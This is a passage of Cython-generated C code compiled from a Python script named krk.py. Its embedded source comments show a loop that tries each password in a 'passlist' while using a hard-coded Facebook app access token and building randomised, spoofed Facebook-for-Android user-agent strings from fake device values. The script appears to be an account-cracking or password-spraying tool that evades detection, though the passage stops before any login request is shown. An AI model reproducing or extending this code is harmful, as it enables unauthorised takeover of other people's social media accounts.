    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_8, &__pyx_t_9, &__pyx_t_10);
    __Pyx_XGOTREF(__pyx_t_8);
    __Pyx_XGOTREF(__pyx_t_9);
    __Pyx_XGOTREF(__pyx_t_10);
    /*try:*/ {

      /* "krk.py":589
 *         sys.stdout.write('\r\r\033[1;37m [ZEA-R-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 *         try:
 *                 for pas in passlist:             # <<<<<<<<<<<<<<
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
 */
      if (likely(PyList_CheckExact(__pyx_v_passlist)) || PyTuple_CheckExact(__pyx_v_passlist)) {
        __pyx_t_1 = __pyx_v_passlist; __Pyx_INCREF(__pyx_t_1); __pyx_t_5 = 0;
        __pyx_t_11 = NULL;
      } else {
        __pyx_t_5 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_v_passlist); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 589, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_11 = __Pyx_PyObject_GetIterNextFunc(__pyx_t_1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 589, __pyx_L3_error)
      }
      for (;;) {
        if (likely(!__pyx_t_11)) {
          if (likely(PyList_CheckExact(__pyx_t_1))) {
            if (__pyx_t_5 >= PyList_GET_SIZE(__pyx_t_1)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_2 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_5); __Pyx_INCREF(__pyx_t_2); __pyx_t_5++; if (unlikely((0 < 0))) __PYX_ERR(0, 589, __pyx_L3_error)
            #else
            __pyx_t_2 = PySequence_ITEM(__pyx_t_1, __pyx_t_5); __pyx_t_5++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 589, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_2);
            #endif
          } else {
            if (__pyx_t_5 >= PyTuple_GET_SIZE(__pyx_t_1)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_2 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_5); __Pyx_INCREF(__pyx_t_2); __pyx_t_5++; if (unlikely((0 < 0))) __PYX_ERR(0, 589, __pyx_L3_error)
            #else
            __pyx_t_2 = PySequence_ITEM(__pyx_t_1, __pyx_t_5); __pyx_t_5++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 589, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_2);
            #endif
          }
        } else {
          __pyx_t_2 = __pyx_t_11(__pyx_t_1);
          if (unlikely(!__pyx_t_2)) {
            PyObject* exc_type = PyErr_Occurred();
            if (exc_type) {
              if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
              else __PYX_ERR(0, 589, __pyx_L3_error)
            }
            break;
          }
          __Pyx_GOTREF(__pyx_t_2);
        }
        __Pyx_XDECREF_SET(__pyx_v_pas, __pyx_t_2);
        __pyx_t_2 = 0;

        /* "krk.py":590
 *         try:
 *                 for pas in passlist:
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'             # <<<<<<<<<<<<<<
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
 *                         fbbv = str(random.randint(111111111,999999999))
 */
        __Pyx_INCREF(__pyx_kp_s_350685531728_62f8ce9f74b12f84c12);
        __Pyx_XDECREF_SET(__pyx_v_accessToken, __pyx_kp_s_350685531728_62f8ce9f74b12f84c12);

        /* "krk.py":591
 *                 for pas in passlist:
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'             # <<<<<<<<<<<<<<
 *                         fbbv = str(random.randint(111111111,999999999))
 *                         android_version = device['android_version']
 */
        __pyx_t_2 = PyTuple_New(5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 591, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_12 = 0;
        __pyx_t_13 = 127;
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 591, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_randint); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 591, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__70, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 591, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 591, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_13;
        __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
        __Pyx_GIVEREF(__pyx_t_6);
        PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_6);
        __pyx_t_6 = 0;
        __Pyx_INCREF(__pyx_kp_u_0_0);
        __pyx_t_12 += 5;
        __Pyx_GIVEREF(__pyx_kp_u_0_0);
        PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_kp_u_0_0);
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_random); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 591, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_randint); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 591, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__71, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 591, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 591, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_13;
        __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_2, 2, __pyx_t_4);
        __pyx_t_4 = 0;
        __Pyx_INCREF(__pyx_kp_u__72);
        __pyx_t_12 += 1;
        __Pyx_GIVEREF(__pyx_kp_u__72);
        PyTuple_SET_ITEM(__pyx_t_2, 3, __pyx_kp_u__72);
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 591, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_randint); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 591, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__70, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 591, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 591, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_13;
        __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
        __Pyx_GIVEREF(__pyx_t_6);
        PyTuple_SET_ITEM(__pyx_t_2, 4, __pyx_t_6);
        __pyx_t_6 = 0;
        __pyx_t_6 = __Pyx_PyUnicode_Join(__pyx_t_2, 5, __pyx_t_12, __pyx_t_13); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 591, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbav, ((PyObject*)__pyx_t_6));
        __pyx_t_6 = 0;

        /* "krk.py":592
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
 *                         fbbv = str(random.randint(111111111,999999999))             # <<<<<<<<<<<<<<
 *                         android_version = device['android_version']
 *                         model = device['model']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_random); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 592, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_randint); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 592, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__73, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 592, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_6); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 592, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbbv, __pyx_t_2);
        __pyx_t_2 = 0;

        /* "krk.py":593
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
 *                         fbbv = str(random.randint(111111111,999999999))
 *                         android_version = device['android_version']             # <<<<<<<<<<<<<<
 *                         model = device['model']
 *                         build = device['build']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_device); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 593, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_6 = __Pyx_PyObject_Dict_GetItem(__pyx_t_2, __pyx_n_s_android_version); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 593, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF_SET(__pyx_v_android_version, __pyx_t_6);
        __pyx_t_6 = 0;

        /* "krk.py":594
 *                         fbbv = str(random.randint(111111111,999999999))
 *                         android_version = device['android_version']
 *                         model = device['model']             # <<<<<<<<<<<<<<
 *                         build = device['build']
 *                         fblc = device['fblc']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_device); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 594, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_2 = __Pyx_PyObject_Dict_GetItem(__pyx_t_6, __pyx_n_s_model); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 594, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF_SET(__pyx_v_model, __pyx_t_2);
        __pyx_t_2 = 0;

        /* "krk.py":595
 *                         android_version = device['android_version']
 *                         model = device['model']
 *                         build = device['build']             # <<<<<<<<<<<<<<
 *                         fblc = device['fblc']
 *                         fbcr = sim_id
 */
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_device); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 595, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_6 = __Pyx_PyObject_Dict_GetItem(__pyx_t_2, __pyx_n_s_build); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 595, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF_SET(__pyx_v_build, __pyx_t_6);
        __pyx_t_6 = 0;

        /* "krk.py":596
 *                         model = device['model']
 *                         build = device['build']
 *                         fblc = device['fblc']             # <<<<<<<<<<<<<<
 *                         fbcr = sim_id
 *                         fbmf = device['fbmf']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_device); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 596, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_2 = __Pyx_PyObject_Dict_GetItem(__pyx_t_6, __pyx_n_s_fblc); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 596, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fblc, __pyx_t_2);
        __pyx_t_2 = 0;

        /* "krk.py":597
 *                         build = device['build']
 *                         fblc = device['fblc']
 *                         fbcr = sim_id             # <<<<<<<<<<<<<<
 *                         fbmf = device['fbmf']
 *                         fbbd = device['fbbd']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_sim_id); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 597, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_XDECREF_SET(__pyx_v_fbcr, __pyx_t_2);
        __pyx_t_2 = 0;

        /* "krk.py":598
 *                         fblc = device['fblc']
 *                         fbcr = sim_id
 *                         fbmf = device['fbmf']             # <<<<<<<<<<<<<<
 *                         fbbd = device['fbbd']
 *                         fbdv = device['fbdv']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_device); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 598, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_6 = __Pyx_PyObject_Dict_GetItem(__pyx_t_2, __pyx_n_s_fbmf); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 598, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbmf, __pyx_t_6);
        __pyx_t_6 = 0;

        /* "krk.py":599
 *                         fbcr = sim_id
 *                         fbmf = device['fbmf']
 *                         fbbd = device['fbbd']             # <<<<<<<<<<<<<<
 *                         fbdv = device['fbdv']
 *                         fbsv = device['fbsv']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_device); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 599, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_2 = __Pyx_PyObject_Dict_GetItem(__pyx_t_6, __pyx_n_s_fbbd); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 599, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbbd, __pyx_t_2);
        __pyx_t_2 = 0;

        /* "krk.py":600
 *                         fbmf = device['fbmf']
 *                         fbbd = device['fbbd']
 *                         fbdv = device['fbdv']             # <<<<<<<<<<<<<<
 *                         fbsv = device['fbsv']
 *                         fbca = device['fbca']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_device); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_6 = __Pyx_PyObject_Dict_GetItem(__pyx_t_2, __pyx_n_s_fbdv); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbdv, __pyx_t_6);
        __pyx_t_6 = 0;

        /* "krk.py":601
 *                         fbbd = device['fbbd']
 *                         fbdv = device['fbdv']
 *                         fbsv = device['fbsv']             # <<<<<<<<<<<<<<
 *                         fbca = device['fbca']
 *                         fbdm = device['fbdm']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_device); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 601, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_2 = __Pyx_PyObject_Dict_GetItem(__pyx_t_6, __pyx_n_s_fbsv); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 601, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbsv, __pyx_t_2);
        __pyx_t_2 = 0;

        /* "krk.py":602
 *                         fbdv = device['fbdv']
 *                         fbsv = device['fbsv']
 *                         fbca = device['fbca']             # <<<<<<<<<<<<<<
 *                         fbdm = device['fbdm']
 *                         fbfw = '1'
 */
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_device); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 602, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_6 = __Pyx_PyObject_Dict_GetItem(__pyx_t_2, __pyx_n_s_fbca); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 602, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbca, __pyx_t_6);
        __pyx_t_6 = 0;

        /* "krk.py":603
 *                         fbsv = device['fbsv']
 *                         fbca = device['fbca']
 *                         fbdm = device['fbdm']             # <<<<<<<<<<<<<<
 *                         fbfw = '1'
 *                         fbrv = '0'
 */
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_device); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 603, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_2 = __Pyx_PyObject_Dict_GetItem(__pyx_t_6, __pyx_n_s_fbdm); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 603, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbdm, __pyx_t_2);
        __pyx_t_2 = 0;

        /* "krk.py":604
 *                         fbca = device['fbca']
 *                         fbdm = device['fbdm']
 *                         fbfw = '1'             # <<<<<<<<<<<<<<
 *                         fbrv = '0'
 *                         fban = 'FB4A'
 */
        __Pyx_INCREF(__pyx_kp_s_1);
        __Pyx_XDECREF_SET(__pyx_v_fbfw, __pyx_kp_s_1);

        /* "krk.py":605
 *                         fbdm = device['fbdm']
 *                         fbfw = '1'
 *                         fbrv = '0'             # <<<<<<<<<<<<<<
 *                         fban = 'FB4A'
 *                         fbpn = 'com.facebook.katana'
 */
        __Pyx_INCREF(__pyx_kp_s_0);
        __Pyx_XDECREF_SET(__pyx_v_fbrv, __pyx_kp_s_0);

        /* "krk.py":606
 *                         fbfw = '1'
 *                         fbrv = '0'
 *                         fban = 'FB4A'             # <<<<<<<<<<<<<<
 *                         fbpn = 'com.facebook.katana'
 *                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'9.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';en_US;FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/'+fbdm+';{density=4.0,width=1440,height=3127};FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';9;FBOP/1;FBCA/'+fbca+';]'
 */
        __Pyx_INCREF(__pyx_n_s_FB4A);
        __Pyx_XDECREF_SET(__pyx_v_fban, __pyx_n_s_FB4A);

        /* "krk.py":607
 *                         fbrv = '0'
 *                         fban = 'FB4A'
 *                         fbpn = 'com.facebook.katana'             # <<<<<<<<<<<<<<
 *                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'9.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';en_US;FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/'+fbdm+';{density=4.0,width=1440,height=3127};FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';9;FBOP/1;FBCA/'+fbca+';]'
 *                         random_seed = random.Random()
 */
        __Pyx_INCREF(__pyx_kp_s_com_facebook_katana);
        __Pyx_XDECREF_SET(__pyx_v_fbpn, __pyx_kp_s_com_facebook_katana);

        /* "krk.py":608
 *                         fban = 'FB4A'
 *                         fbpn = 'com.facebook.katana'
 *                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'9.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';en_US;FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/'+fbdm+';{density=4.0,width=1440,height=3127};FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';9;FBOP/1;FBCA/'+fbca+';]'             # <<<<<<<<<<<<<<
 *                         random_seed = random.Random()
 *                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
 */
        __pyx_t_2 = PyNumber_Add(__pyx_kp_s_Davik_2_1_0_Linux_U_Android, __pyx_v_android_version); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_6 = PyNumber_Add(__pyx_t_2, __pyx_kp_s_9_0_1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = PyNumber_Add(__pyx_t_6, __pyx_v_model); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = PyNumber_Add(__pyx_t_2, __pyx_kp_s_Build); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = PyNumber_Add(__pyx_t_6, __pyx_v_build); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = PyNumber_Add(__pyx_t_2, __pyx_kp_s_FBAN); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = PyNumber_Add(__pyx_t_6, __pyx_v_fban); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = PyNumber_Add(__pyx_t_2, __pyx_kp_s_en_US_FB4A_FBAV); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = PyNumber_Add(__pyx_t_6, __pyx_v_fbav); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = PyNumber_Add(__pyx_t_2, __pyx_kp_s_FBBV); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = PyNumber_Add(__pyx_t_6, __pyx_v_fbbv); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = PyNumber_Add(__pyx_t_2, __pyx_kp_s_FBDM); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = PyNumber_Add(__pyx_t_6, __pyx_v_fbdm); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = PyNumber_Add(__pyx_t_2, __pyx_kp_s_density_4_0_width_1440_height_3_2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_randint); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__74, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_Str(__pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = PyNumber_Add(__pyx_t_6, __pyx_t_4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_2, __pyx_kp_s_FBCR); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = PyNumber_Add(__pyx_t_4, __pyx_v_fbcr); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_2, __pyx_kp_s_FBMF); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
